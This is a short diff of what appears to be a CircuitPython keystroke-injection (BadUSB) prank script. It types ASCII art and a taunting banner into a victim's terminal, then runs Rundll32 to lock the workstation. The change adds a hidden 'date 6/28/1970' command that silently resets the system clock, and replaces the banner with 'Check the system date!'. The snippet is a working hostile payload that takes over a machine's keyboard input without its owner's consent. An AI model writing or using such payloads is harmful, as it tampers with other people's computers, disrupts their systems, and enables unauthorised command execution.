@@ -49,7 +49,7 @@ def launch_terminal():
         layout.write(" #    #   #  #     # #     #    #    #     #   \n")
         layout.write(" #     # ###  #####  #     #    #     #####    \n")
         layout.write("        Remember, its gay to be homophobic!    \n")
-        layout.write("                 Get Quacked Lmao                ")
+        layout.write("               Check the system date!            ")
         kbd.press(Keycode.ENTER), kbd.release_all()
 
 def locksystem():
@@ -62,7 +62,7 @@ def locksystem():
         kbd.press(Keycode.ENTER)
         kbd.release_all()
         time.sleep(0.5)
-        layout.write("Rundll32.exe user32.dll,LockWorkStation & exit")
+        layout.write("Rundll32.exe user32.dll,LockWorkStation & date 6/28/1970 & exit")
         kbd.press(Keycode.ENTER), kbd.release_all()
 
 while True:
